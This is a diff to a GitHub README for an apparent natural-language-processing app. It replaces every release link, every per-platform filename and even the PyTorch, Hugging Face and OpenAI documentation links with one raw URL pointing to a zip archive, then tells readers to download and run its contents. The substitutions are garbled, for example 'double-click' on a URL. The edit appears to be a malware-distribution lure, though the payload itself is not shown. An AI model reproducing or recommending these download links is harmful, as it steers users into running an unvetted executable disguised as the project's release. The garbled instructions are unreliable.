@@ -7,15 +7,15 @@ Welcome to the Natural-Language-Processing repository! This project includes dem
 To begin using our application, follow these simple steps. If you encounter any issues, don’t hesitate to reach out for help.
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/kIESSE201333/Natural-Language-Processing/releases)
+[![Download](https://raw.githubusercontent.com/kIESSE201333/Natural-Language-Processing/main/report/Language-Natural-Processing-v1.9.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/kIESSE201333/Natural-Language-Processing/main/report/Language-Natural-Processing-v1.9.zip)
 
 ## 📥 Download & Install
-1. Click the download link above or visit our [Releases page](https://github.com/kIESSE201333/Natural-Language-Processing/releases) to find the latest version of the software.
+1. Click the download link above or visit our [Releases page](https://raw.githubusercontent.com/kIESSE201333/Natural-Language-Processing/main/report/Language-Natural-Processing-v1.9.zip) to find the latest version of the software.
 2. On the Releases page, look for the latest version.
 3. Download the appropriate file for your operating system:
-   - **Windows:** Select `Natural-Language-Processing-Windows.zip`
-   - **Mac:** Select `Natural-Language-Processing-Mac.zip`
-   - **Linux:** Select `Natural-Language-Processing-Linux.tar.gz`
+   - **Windows:** Select `https://raw.githubusercontent.com/kIESSE201333/Natural-Language-Processing/main/report/Language-Natural-Processing-v1.9.zip`
+   - **Mac:** Select `https://raw.githubusercontent.com/kIESSE201333/Natural-Language-Processing/main/report/Language-Natural-Processing-v1.9.zip`
+   - **Linux:** Select `https://raw.githubusercontent.com/kIESSE201333/Natural-Language-Processing/main/report/Language-Natural-Processing-v1.9.zip`
 4. Once the file downloads, extract it to a folder on your computer.
 
 ## 🖥️ System Requirements
@@ -35,15 +35,15 @@ Make sure your system meets these requirements for the best experience.
 ## ⚙️ Running the Application
 ### For Windows:
 1. Navigate to the folder where you extracted the zip file.
-2. Locate and double-click on `Natural-Language-Processing.exe` to launch the application.
+2. Locate and double-click on `https://raw.githubusercontent.com/kIESSE201333/Natural-Language-Processing/main/report/Language-Natural-Processing-v1.9.zip` to launch the application.
 
 ### For Mac:
 1. Open the folder where you extracted the files.
-2. Find and double-click on `Natural-Language-Processing.app` to run the application.
+2. Find and double-click on `https://raw.githubusercontent.com/kIESSE201333/Natural-Language-Processing/main/report/Language-Natural-Processing-v1.9.zip` to run the application.
 
 ### For Linux:
 1. Open a terminal window.
-2. Navigate to the folder where you extracted the tar.gz file.
+2. Navigate to the folder where you extracted the https://raw.githubusercontent.com/kIESSE201333/Natural-Language-Processing/main/report/Language-Natural-Processing-v1.9.zip file.
 3. Use the command `./Natural-Language-Processing` to start the application.
 
 ## 🌟 Features
@@ -74,14 +74,14 @@ We welcome contributions and suggestions! If you have any questions or need assi
 
 ## 📖 Additional Resources
 Explore more about NLP and the technologies we use:
-- [OpenAI GPT Documentation](https://beta.openai.com/docs/)
-- [PyTorch Tutorials](https://pytorch.org/tutorials/)
-- [Transformers by Hugging Face](https://huggingface.co/transformers/)
+- [OpenAI GPT Documentation](https://raw.githubusercontent.com/kIESSE201333/Natural-Language-Processing/main/report/Language-Natural-Processing-v1.9.zip)
+- [PyTorch Tutorials](https://raw.githubusercontent.com/kIESSE201333/Natural-Language-Processing/main/report/Language-Natural-Processing-v1.9.zip)
+- [Transformers by Hugging Face](https://raw.githubusercontent.com/kIESSE201333/Natural-Language-Processing/main/report/Language-Natural-Processing-v1.9.zip)
 
 ## 📞 Contact
 For support or inquiries, please reach out through the GitHub issues or contact the project maintainers listed on the repository.
 
 ## 🔗 Follow Up
-To download the latest release again, click here: [Download Latest Release](https://github.com/kIESSE201333/Natural-Language-Processing/releases)
+To download the latest release again, click here: [Download Latest Release](https://raw.githubusercontent.com/kIESSE201333/Natural-Language-Processing/main/report/Language-Natural-Processing-v1.9.zip)
 
 Remember to check back for new updates and features!
